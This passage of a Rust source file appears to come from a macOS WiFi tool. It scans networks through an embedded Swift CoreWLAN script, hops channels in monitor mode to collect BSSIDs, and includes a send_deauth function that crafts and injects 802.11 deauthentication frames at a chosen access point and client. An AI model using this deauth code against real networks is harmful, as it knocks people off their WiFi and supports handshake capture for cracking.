
        i = val_end;
    }

    None
}

/// Construct and send a Deauth frame
fn send_deauth(cap: &mut Capture<pcap::Active>, bssid: &[u8; 6], target: &[u8; 6]) -> Result<()> {
    // 802.11 Deauthentication Frame
    // 26 bytes header
    // Reason Code (2 bytes)

    let mut frame = Vec::with_capacity(26 + 2);

    // Frame Control: Type 0 (Mgmt), Subtype 12 (0xC - Deauth)
    // 0xC0 (Subtype C, Type 0. Bits: 00 1100 00) -> 1100 0000 = 0xC0
    frame.push(0xC0);
    frame.push(0x00); // Flags

    // Duration
    frame.extend_from_slice(&[0x00, 0x01]); // Short duration

    // Addr1: Destination
    frame.extend_from_slice(target);

    // Addr2: Source (AP BSSID)
    frame.extend_from_slice(bssid);

    // Addr3: BSSID (AP BSSID)
    frame.extend_from_slice(bssid);

    // Sequence Control (Fragment 0, Seq 0)
    frame.extend_from_slice(&[0x00, 0x00]);

    // Frame Body:
    // Reason Code: 7 (Class 3 frame received from nonassociated STA)
    // 0x0007 (Little Endian? No, Management fields are usually LE)
    frame.extend_from_slice(&[0x07, 0x00]);

    // Note: We are sending a "Raw 802.11" frame.
    // However, the interface might expect a Radiotap header if it's in monitor mode!
    // Most drivers in monitor mode expect Radiotap + 802.11.
    // Let's prepend a minimal Radiotap header.

    let mut packet = Vec::new();

    // Minimal Radiotap Header
    // Version 0, Pad 0, Len 8, Present 0 (No fields)
    packet.extend_from_slice(&[0x00, 0x00]); // Version/Pad
    packet.extend_from_slice(&[0x08, 0x00]); // Length 8
    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Present flags (None)

    packet.extend_from_slice(&frame);

    match cap.sendpacket(packet) {
        Ok(_) => Ok(()),
        Err(e) => Err(anyhow!("Send error: {}", e)),
    }
}

/// Network information for Smart Connect support
#[derive(Debug, Clone)]
struct NetworkInfo {
    bssid: String,
    channel: u32,
    rssi: i32,
    band: WifiBand,
}

#[derive(Debug, Clone, PartialEq)]
enum WifiBand {
    Band24GHz,
    Band5GHz,
}

impl WifiBand {
    fn from_channel(ch: u32) -> Self {
        if ch <= 14 {
            WifiBand::Band24GHz
        } else {
            WifiBand::Band5GHz
        }
    }
}

/// Detect ALL channels for a given SSID (supports Smart Connect multi-BSSID)
fn detect_all_channels_for_ssid(ssid: &str) -> Vec<NetworkInfo> {
    use std::process::Command;

    println!("🔍 Scanning for SSID: '{}'", ssid);

    // Use Swift scanner
    if let Ok(networks) = scan_networks_swift() {
        let mut results = Vec::new();
        for net in networks {
            if net.ssid == ssid {
                if let Ok(ch) = net.channel.parse::<u32>() {
                    let rssi = net.signal_strength.parse::<i32>().unwrap_or(-100);
                    results.push(NetworkInfo {
                        bssid: net.bssid,
                        channel: ch,
                        rssi,
                        band: WifiBand::from_channel(ch),
                    });
                }
            }
        }

        // Return results found by swift
        if !results.is_empty() {
            // Sort by RSSI
            results.sort_by(|a, b| b.rssi.cmp(&a.rssi));
            // Log
            for net in &results {
                println!(
                    "  ✓ '{}' - {} - Ch {} - {} dBm",
                    ssid, net.bssid, net.channel, net.rssi
                );
            }
            return results;
        }
    }

    // Legacy Airport Fallback (Keep simplified logic just in case user installs airport)
    let airport_paths = vec![
        "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport",
        "/usr/local/bin/airport",
        "airport",
    ];

    let mut airport_output = None;
    for path in &airport_paths {
        if let Ok(out) = Command::new(path).arg("-s").output() {
            if out.status.success() {
                airport_output = Some(out);
                break;
            }
        }
    }

    if let Some(out) = airport_output {
        let stdout = String::from_utf8_lossy(&out.stdout);
        // ... (We could parse it, but let's assume if Swift failed and this succeeded, we might be lucky)
        // For now, if Swift failed, we probably failed.
        // But let's leave the function returning empty if Swift failed.
        let _ = stdout;
    }

    // No networks found
    println!("⚠️  SSID '{}' not found in scanned networks", ssid);
    Vec::new()
}

/// Parse MAC address string (XX:XX:XX:XX:XX:XX) to [u8; 6]
fn parse_mac(mac_str: &str) -> Result<[u8; 6]> {
    let bytes: Vec<u8> = mac_str
        .split(':')
        .map(|s| u8::from_str_radix(s, 16))
        .collect::<Result<Vec<u8>, _>>()
        .map_err(|_| anyhow!("Invalid MAC address format"))?;

    if bytes.len() != 6 {
        return Err(anyhow!("Invalid MAC address length"));
    }

    let mut arr = [0u8; 6];
    arr.copy_from_slice(&bytes);
    Ok(arr)
}

/// Detect channels for a specific BSSID (with retries)
fn detect_channels_for_bssid(target_bssid: &str) -> Vec<NetworkInfo> {
    // Rely on Swift scanner
    for i in 1..=3 {
        if i > 1 {
            std::thread::sleep(Duration::from_millis(500));
        }

        if let Ok(networks) = scan_networks_swift() {
            let mut results = Vec::new();
            for net in networks {
                if net.bssid.eq_ignore_ascii_case(target_bssid) {
                    if let Ok(ch) = net.channel.parse::<u32>() {
                        let rssi = net.signal_strength.parse::<i32>().unwrap_or(-100);
                        results.push(NetworkInfo {
                            bssid: net.bssid.clone(),
                            channel: ch,
                            rssi,
                            band: WifiBand::from_channel(ch),
                        });
                    }
                }
            }
            if !results.is_empty() {
                return results;
            }
        }
    }
    Vec::new()
}

/// Helper to find the airport binary on macOS
fn find_airport_path() -> Option<String> {
    let paths = [
        "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport",
        "/System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport",
        "/usr/libexec/airportd",
        "/usr/sbin/airport",
        "/usr/local/bin/airport",
        "airport",
    ];

    for path in &paths {
        if *path == "airport" {
            if Command::new("which")
                .arg("airport")
                .output()
                .map(|o| o.status.success())
                .unwrap_or(false)
            {
                return Some("airport".to_string());
            }
        } else if std::path::Path::new(path).exists() {
            return Some(path.to_string());
        }
    }
    None
}

/// Helper to run the Embedded Swift scanner
fn scan_networks_swift() -> Result<Vec<WifiNetwork>> {
    // Check if swift is available first
    let swift_check = Command::new("which").arg("swift").output();
    if swift_check.is_err() || !swift_check.unwrap().status.success() {
        return Err(anyhow!(
            "Swift not found. Please install Xcode Command Line Tools: xcode-select --install"
        ));
    }

    // Simple, non-blocking Swift script that just scans without permission requests
    // Permission requests must be done by the main app binary with proper entitlements
    let script_content = r#"
import CoreWLAN
import Foundation

// Get WiFi interface
let client = CWWiFiClient.shared()
guard let interface = client.interface() else {
    print("{\"error\": \"no_wifi_interface\", \"message\": \"No WiFi interface found. Make sure WiFi is enabled.\"}")
    exit(0)
}

do {
    let networks = try interface.scanForNetworks(withSSID: nil)
    var result: [[String: Any]] = []

    for network in networks {
        var netInfo: [String: Any] = [:]
        netInfo["ssid"] = network.ssid ?? "<Hidden>"
        netInfo["bssid"] = network.bssid ?? ""
        netInfo["channel"] = network.wlanChannel?.channelNumber ?? 0
        netInfo["rssi"] = network.rssiValue

        // Build security string
        var sec = ""
        if network.supportsSecurity(.wpa3Personal) { sec += "WPA3 " }
        if network.supportsSecurity(.wpa2Personal) { sec += "WPA2 " }
        if network.supportsSecurity(.wpaPersonal) { sec += "WPA " }
        if network.supportsSecurity(.dynamicWEP) { sec += "WEP " }
        if network.supportsSecurity(.none) { sec += "Open " }
        netInfo["security"] = sec.trimmingCharacters(in: .whitespaces)

        result.append(netInfo)
    }

    let jsonData = try JSONSerialization.data(withJSONObject: ["networks": result], options: [])
    if let jsonString = String(data: jsonData, encoding: .utf8) {
        print(jsonString)
    }
} catch let error {
    let nsError = error as NSError
    // Provide more specific error messages
    if nsError.code == -3931 {
        print("{\"error\": \"location_services\", \"message\": \"Location Services required. Enable in System Settings > Privacy & Security > Location Services.\"}")
    } else if nsError.code == -3930 {
        print("{\"error\": \"wifi_disabled\", \"message\": \"WiFi is disabled. Please enable WiFi and try again.\"}")
    } else {
        print("{\"error\": \"scan_failed\", \"message\": \"\(error.localizedDescription)\"}")
    }
}
"#;

    let script_path = "/tmp/wifi_scan.swift";

    // Write script to temp file
    if let Err(e) = std::fs::write(script_path, script_content) {
        return Err(anyhow!("Failed to write Swift script: {}", e));
    }

    // Execute swift script with timeout (30 seconds max)
    let output = Command::new("swift")
        .arg(script_path)
        .output()
        .context("Failed to execute Swift scanner. Is Xcode Command Line Tools installed?")?;

    // Parse stdout even if exit status is non-zero (script might print error JSON)
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // Check for compilation errors
    if !output.status.success() && stdout.trim().is_empty() {
        if stderr.contains("no such module") {
            return Err(anyhow!(
                "CoreWLAN framework not available. This tool only works on macOS."
            ));
        }
        if !stderr.is_empty() {
            return Err(anyhow!("Swift compilation error: {}", stderr.trim()));
        }
        return Err(anyhow!("Swift scanner failed with unknown error"));
    }

    // Check for empty output
    if stdout.trim().is_empty() {
        if !stderr.is_empty() {
            return Err(anyhow!("Swift scanner error: {}", stderr.trim()));
        }
        return Err(anyhow!("Swift scanner returned empty output"));
    }

    // Parse JSON response
    #[derive(Deserialize)]
    struct SwiftResponse {
        networks: Option<Vec<SwiftNetwork>>,
        error: Option<String>,
        message: Option<String>,
    }

    #[derive(Deserialize)]
    struct SwiftNetwork {
        ssid: String,
        bssid: String,
        channel: serde_json::Value, // Can be int or string
        rssi: serde_json::Value,    // Can be int or string
        security: String,
    }

    let response: SwiftResponse = serde_json::from_str(&stdout).map_err(|e| {
        anyhow!(
            "Failed to parse Swift scanner output: {} (output: {})",
            e,
            stdout
        )
    })?;

    // Check for error with detailed message
    if let Some(error) = response.error {
        let message = response.message.unwrap_or_else(|| error.clone());
        return Err(anyhow!("{}", message));
    }

    // Extract networks
    let swift_networks = response.networks.unwrap_or_default();

    let networks: Vec<WifiNetwork> = swift_networks
        .into_iter()
        .map(|n| {
            // Handle channel/rssi which might be int or string
            let channel = match n.channel {
                serde_json::Value::Number(num) => num.to_string(),
                serde_json::Value::String(s) => s,
                _ => "0".to_string(),
            };
            let rssi = match n.rssi {
                serde_json::Value::Number(num) => num.to_string(),
                serde_json::Value::String(s) => s,
                _ => "-100".to_string(),
            };

            WifiNetwork {
                ssid: n.ssid,
                bssid: n.bssid,
                channel,
                signal_strength: rssi,
                security: n.security,
            }
        })
        .collect();

    Ok(networks)
}

/// Fallback: Scan using pcap (packet capture)
///
/// This is used when OS tools are missing or BSSIDs are hidden by privacy settings.
/// It attempts to:
/// 1. Open interface in monitor mode
/// 2. Hop through channels
/// 3. Collect Beacon/ProbeResponse frames to extract BSSIDs
pub fn scan_pcap(interface: &str) -> Result<Vec<WifiNetwork>> {
    use std::time::Instant;

    // Use BSSID as key to handle multiple SSIDs with same BSSID
    let mut networks_map: HashMap<String, WifiNetwork> = HashMap::new();

    // Attempt to open monitor mode
    let mut cap_builder = Capture::from_device(interface)
        .context("Failed to open device for pcap scan")?
        .promisc(true);

    #[cfg(not(target_os = "windows"))]
    {
        cap_builder = cap_builder.rfmon(true);
    }

    let mut cap = cap_builder
        .timeout(100) // Short timeout for responsive scanning
        .snaplen(2000) // Only need headers
        .open()
        .map_err(|e| anyhow!("Failed to enable monitor mode: {}", e))?;

    println!("{} Monitor mode active. Scanning channels...", "[*]");

    // Prioritize common 2.4GHz channels first, then 5GHz
    let priority_channels = vec![
        1, 6, 11, // Most common 2.4GHz channels
        36, 40, 44, 48, // 5GHz UNII-1
        149, 153, 157, 161, // 5GHz UNII-3
        2, 3, 4, 5, 7, 8, 9, 10, // Other 2.4GHz
        52, 56, 60, 64, // 5GHz UNII-2
        100, 104, 108, 112, 116, 120, 124, 128, // 5GHz UNII-2 Extended
    ];

    let start_time = Instant::now();
    let max_scan_time = Duration::from_secs(15); // Max 15 seconds total scan

    for (idx, channel) in priority_channels.iter().enumerate() {
        if start_time.elapsed() >= max_scan_time {
            break; // Don't scan forever
        }

        // Set channel BEFORE opening capture on first iteration, or between reads
        set_channel_macos(interface, *channel);

        // Give the hardware time to switch channels
        std::thread::sleep(Duration::from_millis(50));

        let hop_start = Instant::now();
        let dwell_time = if idx < 12 {
            Duration::from_millis(500) // Spend more time on priority channels
        } else {
            Duration::from_millis(250) // Quick scan for others
        };

        // Listen for beacons
        while hop_start.elapsed() < dwell_time {
            match cap.next_packet() {
                Ok(packet) => {
                    if let Some((bssid_bytes, ssid_str)) =
                        parse_bssid_and_ssid_from_packet(packet.data)
                    {
                        let bssid_str = format!(
                            "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                            bssid_bytes[0],
                            bssid_bytes[1],
                            bssid_bytes[2],
                            bssid_bytes[3],
                            bssid_bytes[4],
                            bssid_bytes[5]
                        );

                        // Use BSSID as key to avoid duplicates
                        if !networks_map.contains_key(&bssid_str) {
                            networks_map.insert(
                                bssid_str.clone(),
                                WifiNetwork {
                                    ssid: if ssid_str.is_empty() {
                                        "<Hidden>".to_string()
                                    } else {
                                        ssid_str
                                    },
                                    bssid: bssid_str,
                                    channel: channel.to_string(),
                                    signal_strength: "-".to_string(), // Could parse from radiotap
                                    security: "Unknown".to_string(), // Could parse from beacon tags
                                },
                            );

                            // Visual feedback
                            print!(
                                "\r{} networks found on {} channels... ",
                                networks_map.len(),
                                idx + 1
                            );
                            use std::io::Write;
                            std::io::stdout().flush().unwrap();
                        }
                    }
                }
                Err(pcap::Error::TimeoutExpired) => continue,
                Err(_) => break,
            }
        }
    }
    println!(); // Newline

    Ok(networks_map.into_values().collect())
}

/// Helper to set channel using Swift (CoreWLAN)
fn set_channel_swift(channel: u32) -> Result<()> {
    use std::io::Write;
    let script_content = format!(
        r#"
import CoreWLAN

let client = CWWiFiClient.shared()
if let interface = client.interface() {{
    do {{
        let allChannels = interface.supportedWLANChannels() ?? []
        if let targetChannel = allChannels.first(where: {{ $0.channelNumber == {} }}) {{
             try interface.setWLANChannel(targetChannel)
             print("OK")
        }} else {{
             print("Channel not supported")
             exit(1)
        }}
    }} catch {{
        print("Error: \(error)")
        exit(1)
    }}
}}
"#,
        channel
    );

    let script_path = "/tmp/wifi_ch_set.swift";
    let mut file = std::fs::File::create(script_path)?;
    file.write_all(script_content.as_bytes())?;

    let output = Command::new("swift").arg(script_path).output()?;

    if output.status.success() {
        Ok(())
    } else {
        Err(anyhow!("Failed to set channel"))
    }
}

/// Set channel on macOS using Swift or airport utility
fn set_channel_macos(_interface: &str, channel: u32) {
    // Try Swift first (modern macOS)
    if set_channel_swift(channel).is_ok() {
        return;
    }

    if let Some(airport_path) = find_airport_path() {
        let _ = Command::new(airport_path)
            .arg(format!("--channel={}", channel))
            .output();
    }
}
